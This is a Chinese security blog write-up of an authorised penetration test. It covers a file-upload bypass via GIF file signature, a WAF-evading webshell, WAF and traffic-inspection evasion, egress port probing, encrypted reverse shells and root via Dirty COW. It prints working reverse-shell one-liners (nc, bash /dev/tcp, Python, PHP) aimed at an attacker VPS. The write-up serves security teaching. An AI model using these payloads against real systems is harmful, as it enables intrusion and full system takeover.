**完整攻击链大概包括信息搜集、漏洞利用、建立据点、权限提升、权限维持、横向移动、痕迹清除等七步，虽然这个站点只经历了前四步，但也具有较强的代表性，组合利用漏洞形成攻击链，拿下管理权限。**

前情提要：[全程带阻：记一次授权网络攻防演练（上）](https://www.freebuf.com/vuls/211842.html)

## 建立据点

真是麻烦，整了这么久，才获得一个可用的上传功能而已，还不一定能上传 webshell，走一步看一步。

在我看来，任意文件上传攻击应关注四个要素：找寻文件路径、指定文件扩展名、写入脚本代码、防 WAF 拦截。

找寻文件路径。上传 webshell
后肯定要访问，势必得晓得文件写入路径，通常上传成功后，路径将回显在应答中，但该站并无回显，但好在它是个图片，所以，在页面右键即可查看文件路径：

![1566216142_5d5a8fceb7c55.png!small](https://image.3001.net/images/20190819/1566216142_5d5a8fceb7c55.png!small)

同时，为了方便后续调试，我把查询文件路径的接口保留下来：

![1566216150_5d5a8fd68a8a6.png!small](https://image.3001.net/images/20190819/1566216150_5d5a8fd68a8a6.png!small)

指定文件扩展名。上传报文中，涉及文件扩展名的地方如下三处：

![1566216159_5d5a8fdf58afc.png!small](https://image.3001.net/images/20190819/1566216159_5d5a8fdf58afc.png!small)

我得逐一验证哪个是影响服务端写入文件时用到的扩展名。尝试将第一处 fileName 域的 info.png 改为 info.jsp，确认写入文件名：

![1566216165_5d5a8fe5af881.png!small](https://image.3001.net/images/20190819/1566216165_5d5a8fe5af881.png!small)

wow，这运气。

写入脚本代码。接下来，我把上传报文中的图片数据替换为一行无害的 JSP 代码：

![1566216172_5d5a8fec1b4fc.png!small](https://image.3001.net/images/20190819/1566216172_5d5a8fec1b4fc.png!small)

上传失败，文件内容是唯一变更的地方，那么，我可以合理猜测服务端要么检测了文件内容是否存在脚本代码，要么检测了文件头是否为图片类型。

验证是否检测了脚本代码。我把这行 JSP 代码改为普通文本：

![1566216178_5d5a8ff2b39fc.png!small](https://image.3001.net/images/20190819/1566216178_5d5a8ff2b39fc.png!small)

仍然失败，说明并非检测了恶意代码。

验证是否检测了文件头。不同类型的文件都有对应的文件类型签名（也叫类型幻数，简称文件头），比如，PNG 的文件头为十六进制的 89 50 4E 47 0D
0A 1A 0A、GIF 为 47 49 46 38 37 61、JPG 为 FF D8 FF E0。于是，我添加了 PNG 文件头后再次上传：

![1566216189_5d5a8ffd79b82.png!small](https://image.3001.net/images/20190819/1566216189_5d5a8ffd79b82.png!small)

wowo，上传成功。立即访问，确认能否解析：

![1566216194_5d5a90022d3af.png!small](https://image.3001.net/images/20190819/1566216194_5d5a90022d3af.png!small)

500 错误，不应该啊，就这么一行无害普通代码，怎么会导致服务端错误呢？！会不会 PNG 头中存在不可见字符，导致解析报错？改成全是可见字符的 GIF
头试试：

![1566216200_5d5a9008bf633.png!small](https://image.3001.net/images/20190819/1566216200_5d5a9008bf633.png!small)

确认能否正常解析：

![1566216207_5d5a900ff32ef.png!small](https://image.3001.net/images/20190819/1566216207_5d5a900ff32ef.png!small)

呵呵，讲究！换成 GIF 文件头可成功解析。

防 WAF 拦截。接下来，我把无害 JSP 代码替换为命令执行的小马，成功上传、成功解析、成功执行命令：

![1566216216_5d5a901862c47.png!small](https://image.3001.net/images/20190819/1566216216_5d5a901862c47.png!small)

哈哈，第七个洞，文件类型签名可绕过，导致任意文件上传 getshell。

我的内心开始放荡，抑制不住激动的心情按下了 F5，居然又出幺蛾子：

![1566216222_5d5a901e02268.png!small](https://image.3001.net/images/20190819/1566216222_5d5a901e02268.png!small)

顺利写马、可以执行一次命令、刷新页面出现禁止访问，这种现象，我怀疑 WAF 作祟，它发现流量中携带恶意行为后拒绝请求。

两年前，突破 WAF 我大概会用到这几种手法：分块传输、畸型请求、转义序列、偏僻编码、TLS
滥用，而如今，划时代的冰蝎问世（尽管它未开源），让我几乎可以忽视 WAF 的存在。上古时代的各类一句话、小马、大马早已成为各大 WAF
出厂默认封杀规则；传奇 webshell
管理客户端菜刀也年久失修，明文流量毫无隐私可言；冰蝎，采用密钥变换手法，将文本载荷转为二进制流，再进行加密传输，天生具备防流量监测的能力。

所以，我上传冰蝎马：

![1566216228_5d5a9024ebe47.png!small](https://image.3001.net/images/20190819/1566216228_5d5a9024ebe47.png!small)

直接访问报错：

![1566216237_5d5a902d34446.png!small](https://image.3001.net/images/20190819/1566216237_5d5a902d34446.png!small)

没关系，冰蝎马未处理异常，不影响管理端连接：

![1566216242_5d5a9032ebac9.png!small](https://image.3001.net/images/20190819/1566216242_5d5a9032ebac9.png!small)

现在，我可以随意执行命令：

![image.png](https://image.3001.net/images/20190821/1566370273_5d5ce9e113daf.png!small)管理文件：

![1566216254_5d5a903eaba56.png!small](https://image.3001.net/images/20190819/1566216254_5d5a903eaba56.png!small)

题外话，关于上传漏洞，冰蝎流量监测、白名单扩展绕过，这有两点你可以了解下：

> 1\. 冰蝎流量能逃过所有品牌的 WAF 监测么？几乎是，唯一逃不过奇安信（原
> 360、原原网神）的天眼系统，冰蝎管理端与冰蝎马建立会话时需要获取动态密钥，这个过程中的请求与应答的两个报文存在特征，天眼的着力点在此（作者后续补充，此处为他见过有限的
> WAF 品牌中，只有天眼能发现冰蝎的流量，其他大部份品牌未作验证）；
>
> 2\. 任意文件上传攻击，遇到服务端扩展名白名单的场景，除了常规的解析漏洞手法外，还可能关注本地文件包含漏洞（LFI），以及 HTTP
> 参数污染漏洞（HPP），特别是 HPP，在突破白名单限制时，很有杀伤力。

## 系统提权

webshell 虽然赋予我执行命令、管理文件的能力，但毕竟不是真正的
shell，无法执行交互式命令、无法控制进程状态、无法补全命令等等，非常不利于提权操作，所以，必须反弹 shell。

通过冰蝎在目标上执行反弹命令：

![1566216267_5d5a904b2750a.png!small](https://image.3001.net/images/20190819/1566216267_5d5a904b2750a.png!small)

VPS 监听：

![1566216273_5d5a905162f55.png!small](https://image.3001.net/images/20190819/1566216273_5d5a905162f55.png!small)

等昏过去了都没见到 shell 回来，反弹 shell
失败！导致失败的因素很多，经验来看，常见如下几类：反弹命令不存在、禁止出口流量、限定向外访问端口、流量审查。

验证是否反弹命令不存在。我常用的几个反弹命令：nc/nc.openbsd/nc.traditional、bash/sh/dash、python/perl/PHP/ruby、exec。

用 nc 反弹，命令如下：

    
    
    nc <your_vps> 1024 -e /bin/sh

某些目标的 nc 不支持 -e 参数，有两个解决思路，要么使用其他版本的 nc：

    
    
    nc.traditional <your_vps> 1024 -e /bin/sh

要么配合命名管道进行反弹：

    
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <your_vps> 1024 >/tmp/f

用 bash 反弹：

    
    
    /bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1

用 python 反弹：

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_vps>",1024));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

用 PHP 反弹：

    
    
    php -r '$sock=fsockopen("<your_vps>",1024);exec("/bin/sh -i <&3 >&3 2>&3");'

用 exec 反弹：

    
    
    0<&amp196exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196

在目标上查看相关命令是否存在：

![image.png](https://image.3001.net/images/20190821/1566369208_5d5ce5b88dbb6.png!small)看来除
PHP 外，其他反弹命令都可用，那么先前反弹失败并非 bash 命令的原因。

验证是否禁止出口流量。某些目标在防火墙上限制了出口流量，禁止目标主动向外发起网络请求，我计划通过带外（Out Of
Band）的方式进行验证。大致逻辑是，在攻击者自己的 VPS 上监测某种协议的网络请求，在目标上用这种协议访问 VPS，若在 VPS
上看到该协议的请求日志，则可推断出目标允许出口流量。

为了减少其他因素干扰，我习惯选用无端口的协议进行出口流量的测试，ICMP 最单纯。你知道互联网上随时都有 ICMP 的刺探，导致 VPS
看到的日志量非常大，所以，我指定 ping 的包的大小，这样方便过滤。

第一步，虽然我指定了 ping 包大小，但实际大小由系统确定，先在目标上执行 ping 命令，获取实际包大小：

![image.png](https://image.3001.net/images/20190821/1566369304_5d5ce6184ad6e.png!small)我用
-s 选项指定包大小为 64 个字节，系统实际发送了 92 个字节，以 length 92 为关键字查找 ICMP 记录。

第二步，在 VPS 上监控 ICMP 日志：

![image.png](https://image.3001.net/images/20190821/1566369313_5d5ce6216d6e0.png!small)第三步，在目标上再次执行
ping 命令：

![image.png](https://image.3001.net/images/20190821/1566369319_5d5ce62744117.png!small)第四步，
在 VPS 上查看到大小为 92 的 ICMP 包：

![image.png](https://image.3001.net/images/20190821/1566369325_5d5ce62da372e.png!small)经过以上四步，我确认目标允许出口流量。

验证是否限定向外访问端口。某些目标限定访问外部端口，常见黑名单和白名单两种方式。黑名单，比如，禁止目标机器向外访问 MSF 默认的 4444
端口；白名单，比如，只允许向外访问 web 常见的 80 端口，注意下，攻击端即便监听的 80 端口，getshell 的流量采用的也并非 HTTP
协议，而是普通的 socket，切勿与 HTTP 隧道 getshell 混淆。

先前反弹失败用的是 1024 端口，换个端口 2941 监听试试：

![image.png](https://image.3001.net/images/20190821/1566369453_5d5ce6ad67bfb.png!small)目标上用
HTTP 协议访问 VPS 的 2941 端口：

![image.png](https://image.3001.net/images/20190821/1566369459_5d5ce6b3b2cfd.png!small)等待片刻，VPS
的并无 HTTP 记录，所以，怀疑采用白名单。经验来看，端口白名单通常只允许向外访问 HTTP 服务的默认 80、HTTPS 服务的默认
443，于是，VPS 监听 443 端口，目标上访问 443，这时 VPS 上获得 443 端口的访问记录：

![image.png](https://image.3001.net/images/20190821/1566369466_5d5ce6ba2659c.png!small)那么，我可以几乎断定目标的确是用白名单机制限制了向外访问的端口号，其中猜测出
443 端口在白名单范围内。

验证是否存在流量审查。换成 443 端口后应该顺利反弹 shell，服务端的确也收到了
shell，但还没来得及执行任何命令，马上就就掉线了。我猜测服务端可能存在某种流量检测设备，以物理旁路、逻辑串联的方式接入在网络中，一旦发现恶意行为，分别向客户端和服务端发送
RESET 的 TCP 包，达到断开客户端和服务端连接的目的，表象类似传统堡垒机的防绕行机制。

流量审查，审查设备必定得到明文流量数据才行，要防审查自然想到加密流量。所以，我不再简单地用 bash 来反弹 shell，而在此基础上，将原始流量用
openssl 加密，这样就能达到防流量审查的目的。

具体而言，第一步，在VPS 上生成 SSL 证书的公钥/私钥对：

![image.png](https://image.3001.net/images/20190821/1566369478_5d5ce6c67a9ea.png!small)第二步，VPS
监听反弹 shell：

![image.png](https://image.3001.net/images/20190821/1566369487_5d5ce6cf43cea.png!small)第三步，目标上用
openssl 加密反弹 shell 的流量：

![image.png](https://image.3001.net/images/20190821/1566369492_5d5ce6d4ed2db.png!small)第四步，VPS
上成功获取加密的哑 shell：

![image.png](https://image.3001.net/images/20190821/1566369766_5d5ce7e6d9fe5.png!small)现在，我得到的仅仅是个简陋的哑
shell，并非交互式 shell。基于以下几个原因，让我有强烈驱动力将哑 shell 转为交互式 shell：防止 ctrl-c 中断 getshell
会话、无法查看语法高亮、无法执行交互式命令、无法查看错误输出、无法使用 tab 命令补全、无法操控 job、无法查看命令历史。

具体如下，第一步，在哑 shell 中执行：

    
    
    $ python -c 'import pty; pty.spawn("/bin/bash")'

键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：

    
    
    $ stty raw -echo
    
    $ fg

回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：

    
    
    $ reset
    
    $ export SHELL=bash
    
    $ export TERM=xterm-256color
    
    $ stty rows 54 columns 104

这样，我得到了功能齐全的交互式 shell，比如，支持命令补全、语法高亮：

![image.png](https://image.3001.net/images/20190821/1566369785_5d5ce7f903b08.png!small)一切就绪，正式进入提权操作。提权的手法很多，比如，利用内核栈溢出提权、搜寻配置文件中的明文密码、环境变量劫持高权限程序、不安全的服务、借助权能（POSIX
capabilities）提权、sudo 误配、SUID 滥用等等。我喜欢快刀斩乱麻，将 linux-exploit-suggester-2
上传至目标后运行：

![image.png](https://image.3001.net/images/20190821/1566369800_5d5ce80833377.png!small)提示当前内核可能存在脏牛漏洞，上传本地编译好的脏牛
exp，执行后毫无波澜地拿到了 root：

![image.png](https://image.3001.net/images/20190821/1566369806_5d5ce80e62f62.png!small)虽然这个目标用内核漏洞成功提权，对我而言，只能算作运气好，在如今的网络安全生态下，运维人员已有足够的安全意识，安装系统补丁早已融入日常工作。所以，我有必要分享一种内核漏洞之外的提权手法，它的成功率非常高，并且不像内核提权那样可能导致系统挂起，它就是对系统完全无损的
sudo 误配提取手法。

个人非常、十分、特别喜欢它，sudo 误配的一种利用手法是，查看 home​/ 目录下是否 .sudo_as_admin_successful
文件，若有则可以输入当前低权账号的密码直接 sudo su 切换为 root
用户，而在已经获取当前账号的系统环境的前提下，要拿到低权账号的密码，虽然有门槛，但也不是不可能（如，翻找各类配置文件）。

靶机 JIS-CTF-VulnUpload-CTF01 就是很好的一个案例。首先，利用 web 漏洞拿到低权账号 technawi 的
meterpreter 会话：

![image.png](https://image.3001.net/images/20190821/1566369821_5d5ce81d5b483.png!small)接着，翻找文件找到其密码：

![image.png](https://image.3001.net/images/20190821/1566369826_5d5ce822d887e.png!small)然后，发现
home/ 中存在 .sudo_as_admin_successful 文件：

![image.png](https://image.3001.net/images/20190821/1566369832_5d5ce82818a69.png!small)最后，用
technawi 自己的密码切换为 root 用户：

![image.png](https://image.3001.net/images/20190821/1566369837_5d5ce82d6f661.png!small)就这样，成功提权！

说这么多，不是排名哪种提权手法优秀、哪种拙劣，能达到目的，适合你思维模式的，就是最好的，你说呢！

## 故事尾声

到此，任务算完成了，整个过程很有意思，目标环境设有层层防御，但每道防线或多或少存在些小问题，多个小问题串起来，便成了黑客进入系统内部的攻击路径。

完整来说，全流程的攻击链包括信息搜集、漏洞利用、建立据点、权限提升、权限维持、横向移动、痕迹清除等七步，虽然这个站点只经历了前四步，但也具有较强的代表性。简单回顾下，大概经过以下关键步骤：

> 1\. 密码找回功能处，图片验证码未刷新，导致可枚举用户名，得到三个有效账号：nana、admin、liufei；
>
> 2\. 密码找回功能，若是有效用户，服务端泄漏有效用户的敏感信息，包括哈希密码；
>
> 3\. 由于系统存在弱口令，导致通过彩虹表反解出 liufei 的密码；
>
> 4\. 通过 liufei 账号登录系统，发现为低权账号，无可利用功能；
>
> 5\. 回到 nana 账号上，通过制作社工密码，暴破出该账号密码；
>
> 6\. 登录 nana 账号，找到上传点，但非 admin 而禁止上传；
>
> 7\. 回到 admin 账号上，重新审查密码找回功能，发现存在 IDOR，可重置 admin 密码，但业务厂商告知不能重置，作罢；
>
> 8\. 再次登录 nana 账号，分析上传请求报文，发现服务端通过 JWT 作为身份凭证，由于 JWT 采用弱密钥，导致垂直越权至 admin；
>
> 9\. 以 admin 身份上传，服务端通过文件类型签名作为上传限制，可轻松绕过，成功上传 webshell；
>
> 10\. 服务端审查 webshell 流量，无法长时间使用，改用冰蝎马，实现 POST 数据二进制化、加密化，突破 webshell 流量审查；
>
> 11\. 反弹 shell 时遇阻，目标设置向外访问端口白名单，通过各种手法找到端口白名单包含 80、443；
>
> 12\. 设置反弹 shell 至 443 端口仍失败，发现目标部署反弹流量审查设备，于是，用 openssl 加密反弹流量，成功获取反弹 shell；
>
> 13\. 为方便后续提权、维权、移动，通过技巧将反弹的哑 shell 转为全功能的交互式 shell；
>
> 14\. 通过查找目标内核版本，发现存在脏牛漏洞，上传 exp 后顺利提权为 root。

最后，杜兄弟也兑现了承诺：

![image.png](https://image.3001.net/images/20190821/1566369851_5d5ce83b1820c.png!small)虽然做人要向
qian 看，但它并不是快乐的源泉，全程带阻、层层突破、直捣黄龙，或许，这才是真正的乐趣！

（部分信息敏感，内容适当调整）

 ***本文原创作者：yangyangwithgnu，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

